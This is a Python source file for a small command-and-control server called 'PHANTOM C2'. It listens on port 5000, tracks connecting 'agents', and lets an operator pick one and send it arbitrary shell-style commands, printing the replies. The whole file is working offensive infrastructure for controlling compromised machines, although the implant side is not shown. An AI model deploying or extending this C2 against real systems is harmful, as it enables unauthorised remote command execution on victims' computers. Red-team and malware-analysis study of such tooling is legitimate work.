import socket
import threading
import readline
from collections import OrderedDict
from menu import Menu, GREEN, ORANGE, PURPLE, RESET     #import menu.py module
from ascii_art import BANNER_ART                #import sick ascii 

class AutoComplete:
    def __init__(self, options):
        self.options = sorted(options)
        self.matches = []

    def complete(self, text, state):
        if state == 0:
            if text:
                self.matches = [s for s in self.options if s and s.startswith(text)]
            else:
                self.matches = self.options[:]
        try:
            return self.matches[state]
        except IndexError:  
            return None

# Global dictionary to store client connections
clients = {}
agent_counter = 1

def handle_client_connection(client_socket, addr):
    global agent_counter
    client_id = f"phantom.{agent_counter}"
    agent_counter += 1

    clients[client_id] = client_socket
    print(f"\n{GREEN}Agent {client_id} connected!{RESET}\n")
    print(f"\n{GREEN}Type \"interact {client_id}\" to interact with {client_id}{RESET}\n")

    try:
        while True:
            pass  # Currently, just keeping the connection open
    except Exception as e:
        print(f"{ORANGE}Error with agent {client_id}: {e}{RESET}")
    finally:
        del clients[client_id]
        client_socket.close()
        print(f"\n{GREEN}Agent {client_id} disconnected...{RESET}\n")

def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', 5000))
    server_socket.listen(5)
    print(f"\n{GREEN}Server is listening on port 5000...{RESET}\n")

    while True:
        client_socket, addr = server_socket.accept()
        client_thread = threading.Thread(target=handle_client_connection, args=(client_socket, addr))
        client_thread.start()

def interact_with_agent(agent_id, mainMenu):
    if agent_id in clients:
        mainMenu.setPrompt(f"{agent_id}")  # Set the prompt to the agent ID
        while True:
            command = input(f"{GREEN}{mainMenu.name} > {RESET}")
            if command.lower() in ['back', 'exit']:
                mainMenu.setPrompt("PHANTOM C2 MENU > ")  # Reset the prompt
                break

            send_command(command, clients[agent_id])
            receive_response(clients[agent_id])
    else:
        print(f"{ORANGE}Agent {agent_id} not found.{RESET}\n")
        mainMenu.setPrompt("\nPHANTOM C2 MENU > ")  # Reset the prompt if agent not found


def send_command(command, client_socket):
    encoded_command = command.encode()
    command_length = len(encoded_command).to_bytes(4, 'big')
    client_socket.sendall(command_length)
    client_socket.sendall(encoded_command)

def receive_response(client_socket):
    response_length = int.from_bytes(client_socket.recv(4), 'big')
    response = client_socket.recv(response_length).decode()
    print(f"\n{ORANGE}Response:\n{RESET}{response}\n")

def main_menu():
    mainMenu = Menu("PHANTOM C2 MENU > ")
    mainMenu.registerCommand("agents", "List active agents", "")
    mainMenu.registerCommand("interact", "Interact with an agent", "<agent-id>")
    mainMenu.registerCommand("help", "Show this help message", "")
    mainMenu.registerCommand("exit", "Exit the application", "")
    mainMenu.uCommands()

    while True:
        command, args = mainMenu.parse()
        if command == "agents":
            print(f"\n{GREEN}Type \"interact <agent_id>\" to interact with an agent{RESET}")
            print(f"{PURPLE}Active agents:{RESET}")

            for client_id in clients.keys():
                print(f"{PURPLE}{client_id}{RESET}")
            print()
        elif command.startswith("interact"):
            if len(args) < 1:
                print(f"{ORANGE}Please specify an agent ID.{RESET}\n")
                continue
            elif len(args) == 1:
                agent_id = args[0]
                interact_with_agent(agent_id, mainMenu)
                # print(f"\nConnected to {agent_id}!\n")


        elif command == "help":
            mainMenu.showHelp()
        elif command == "exit":
            break
        else:
            print(f"{ORANGE}Invalid command.{RESET}\n")

if __name__ == '__main__':        
    print(f"\n\n\n{GREEN}{BANNER_ART}{RESET}\n")
    server_thread = threading.Thread(target=start_server)
    server_thread.start()
    main_menu()
